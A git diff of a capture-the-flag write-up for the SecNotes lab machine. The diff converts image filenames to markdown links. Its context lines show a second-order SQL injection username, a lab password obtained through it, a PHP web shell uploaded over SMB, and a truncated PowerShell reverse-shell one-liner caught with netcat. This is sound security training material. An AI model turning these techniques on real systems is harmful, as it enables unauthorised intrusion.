@@ -6,7 +6,7 @@
 
 ----------------------------------------------------------------------
 
-SecNotes.png
+![SecNotes.png](../assets/secnotes_assets/SecNotes.png)
 
 ### Enumeration
 
@@ -78,25 +78,27 @@ Nmap done: 1 IP address (1 host up) scanned in 52.15 seconds
 
 Checking out the webpage on port 80, we see a simple login page:
 
-login.png
+![login.png](../assets/secnotes_assets/login.png)
 
 After trying several weak password combos and basic login bypasses via SQL injection, I decided to try creating a new user. But rather than a normal username (admin:password) I tried a second order SQL injection and created a user `' or 1='1` with a password of Password123!. This was an attempt to exploit a SQL injection and get access to the database via a login.
 
-signup.png
+![signup.png](../assets/secnotes_assets/signup.png)
 
 It worked! After logging in as the created 'user' I was able to grab what appear to be a username and password: `tyler:92g!mA8BGjOirkL%OG*&`
 
 Lets try to use these credentials with SMB. 
 
-smbmap.png
+![smbmap.png](../assets/secnotes_assets/smbmap.png)
 
 Cool, I was able to see which shares I can access as user Tyler. What catches my eye is that I have both read and write permissions to the `new-site` share. Lets check that out:
 
-smbclient.png
+![smbclient.png](../assets/secnotes_assets/smbclient.png)
 
 Interesting, this appears to be a share containing IIS information. Recalling back to our initial Nmap scan I remembered there were two HTTP pages, one on port 80, and the other on port 8808.
 
 Navigating to http://10.10.10.97:8808/ sure enough we find an IIS landing page.
+
+![iis.png](../assets/secnotes_assets/iis.png)
 
 Lets upload a web shell to the SMB share and see if we can get execution that way. 
 
@@ -121,7 +123,7 @@ putting file shell.php as \shell.php (0.2 kb/s) (average 0.1 kb/s)
 ```
 Navigating to the file in the browser we can confirm we now have execution on the machine.
 
-whoami.png
+![whoami.png](../assets/secnotes_assets/whoami.png)
 
 Lets grab a PowerShell reverse shell from https://www.revshells.com/ and URL encode it:
 
@@ -131,13 +133,13 @@ powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Socke
 
 After setting up a netcat listener and issuing the PowerShell one liner as a cmd, we catch a shell back and can grab the user.txt flag:
 
-user_flag.png
+![user_flag.png](../assets/secnotes_assets/user_flag.png)
 
 ### Privilege Escalation
 
 Checking out the contents of `C:\` we see an interesting file, Ubuntu.zip:
 
-ubuntu.png
+![ubuntu.png](../assets/secnotes_assets/ubuntu.png)
 
 This makes me wonder if the machine is running Windows Subsystem for Linux. 
 
@@ -145,7 +147,7 @@ After Googling around a bit I find I can access the Linux system at `AppData\Loc
 
 And sure enough I find I can access the root directory:
 
-root_dir.png
+![root_dir.png](../assets/secnotes_assets/root_dir.png)
 
 And interestingly, the `.bash_history` file doesn't appear to be empty, or dumping to `/dev/null`:
 
@@ -178,7 +180,7 @@ exit
 
 Lets use impacket-psexec to login and grab the root.txt flag
 
-root_flag.png
+![root_flag.png](../assets/secnotes_assets/root_flag.png)
 
 That was a super fun box with some interesting concepts in it. It was especially fun working with Windows Subsystem for Linux because I haven't played with that too much and it was great to learn more about it.
 
